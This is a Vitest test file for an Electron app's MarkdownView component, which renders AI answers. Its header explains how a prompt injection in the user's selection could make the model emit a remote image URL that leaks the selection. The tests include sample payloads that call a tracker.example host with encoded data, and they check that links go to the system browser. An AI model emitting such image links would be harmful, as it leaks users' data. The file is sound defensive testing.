/**
 * @file MarkdownView.test.ts
 * @description `MarkdownView` renders MODEL-CONTROLLED markdown — an Ask AI
 * answer, which a prompt injection in the user's own selection can steer. Two
 * consequences this file pins, both of which the first version got wrong:
 *
 * 1. **Remote images must not load.** `![x](https://tracker/pixel)` would make
 *    the result window fetch an attacker-chosen URL the moment the answer
 *    renders — a read receipt at minimum, and an exfiltration channel once the
 *    injected answer encodes the selection into the path. The release-notes
 *    renderer in `SettingUpdates.tsx` already suppresses `img` for the same
 *    reason; this one had no `img` override at all.
 * 2. **Links must go to the system browser, not a new BrowserWindow.** Neither
 *    Ask window installs a `setWindowOpenHandler`, so a bare
 *    `target="_blank"` gets Electron's default window-open behaviour: an
 *    unmanaged, app-owned window outside the result-window cap and lifecycle,
 *    rendering a remote page with a preload attached. Clicks route through the
 *    `openExternalLink` bridge (main-side http/https validated) instead.
 *
 * Drives the component with `react-dom/client` + `act` (Vitest collects
 * `.test.ts` only), same as `CorrectionResultWindow/index.test.ts`.
 */
import { act, createElement } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { MarkdownView } from "./MarkdownView";

const waitForUi = async () => {
  await act(async () => {
    await Promise.resolve();
  });
};

describe("MarkdownView", () => {
  let container: HTMLDivElement;
  let root: Root;
  let openExternalLink: ReturnType<typeof vi.fn>;

  const render = async (markdown: string) => {
    await act(async () => {
      root.render(createElement(MarkdownView, { markdown }));
    });
    await waitForUi();
  };

  beforeEach(() => {
    openExternalLink = vi.fn().mockResolvedValue({ success: true });
    (window as unknown as { electronAPI: unknown }).electronAPI = {
      openExternalLink,
    };
    container = document.createElement("div");
    document.body.appendChild(container);
    root = createRoot(container);
  });

  afterEach(() => {
    act(() => {
      root.unmount();
    });
    container.remove();
    vi.restoreAllMocks();
  });

  describe("remote images", () => {
    it("renders no <img> for a remote image, so nothing is fetched", async () => {
      await render("![pixel](https://tracker.example/pixel.png)");

      expect(container.querySelector("img")).toBeNull();
    });

    it("renders no <img> for an image whose URL encodes the selection", async () => {
      await render(
        "Answer.\n\n![](https://tracker.example/c?d=aGVsbG8gc2VjcmV0)\n",
      );

      expect(container.querySelector("img")).toBeNull();
      expect(container.textContent).toContain("Answer.");
    });

    it("renders no <img> for a data: URI either", async () => {
      await render("![x](data:image/png;base64,iVBORw0KGgo=)");

      expect(container.querySelector("img")).toBeNull();
    });
  });

  describe("links", () => {
    it("routes a clicked link through openExternalLink instead of navigating", async () => {
      await render("[docs](https://example.com/docs)");

      const anchor = container.querySelector("a");
      expect(anchor).not.toBeNull();

      const event = new MouseEvent("click", {
        bubbles: true,
        cancelable: true,
      });
      await act(async () => {
        anchor?.dispatchEvent(event);
      });

      expect(openExternalLink).toHaveBeenCalledWith("https://example.com/docs");
      expect(event.defaultPrevented).toBe(true);
    });

    it("does not open a new window: the anchor carries no target=_blank", async () => {
      await render("[docs](https://example.com/docs)");

      expect(container.querySelector("a")?.getAttribute("target")).toBeNull();
    });

    it("does not call the bridge for a link with no href", async () => {
      await render("[empty]()");

      const anchor = container.querySelector("a");
      await act(async () => {
        anchor?.dispatchEvent(
          new MouseEvent("click", { bubbles: true, cancelable: true }),
        );
      });

      expect(openExternalLink).not.toHaveBeenCalled();
    });

    it("still renders the link text", async () => {
      await render("[docs](https://example.com/docs)");

      expect(container.querySelector("a")?.textContent).toBe("docs");
    });
  });

  it("still renders ordinary GFM content (table, fenced code, list)", async () => {
    await render(
      [
        "| a | b |",
        "| - | - |",
        "| 1 | 2 |",
        "",
        "```ts",
        "const x = 1;",
        "```",
        "",
        "- one",
        "- two",
      ].join("\n"),
    );

    expect(container.querySelector("table")).not.toBeNull();
    expect(container.querySelector("pre code")?.textContent).toContain(
      "const x = 1;",
    );
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });
});
